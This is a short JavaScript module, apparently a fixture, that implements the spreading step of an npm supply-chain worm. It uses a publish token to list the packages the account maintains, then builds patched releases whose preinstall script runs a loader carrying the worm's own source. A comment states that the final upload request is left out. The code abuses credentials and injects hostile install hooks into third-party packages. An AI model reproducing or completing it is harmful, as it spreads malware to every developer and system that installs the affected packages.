// Uses a valid publish token to re-release packages the account can write to.
const https = require("https");

function listWritablePackages(token) {
  return new Promise((resolve) => {
    https.get({
      hostname: "registry.npmjs.org",
      path: "/-/v1/search?text=maintainer:me&size=100",
      headers: { authorization: "Bearer " + token },
    }, (res) => {
      let buf = "";
      res.on("data", (c) => (buf += c));
      res.on("end", () => resolve(JSON.parse(buf).objects || []));
    });
  });
}

async function infectPackage(token, pkg, selfSource) {
  const meta = pkg.package;
  // rewrite lifecycle so that installing the next release runs this loader
  const manifest = {
    name: meta.name,
    version: bumpPatch(meta.version),
    scripts: { preinstall: "node setup.mjs" },
  };
  return { manifest, payload: selfSource, token };
  // the actual PUT to /<name> is omitted from the fixture
}

function bumpPatch(v) {
  const [a, b, c] = v.split(".").map(Number);
  return [a, b, c + 1].join(".");
}

module.exports = { listWritablePackages, infectPackage };
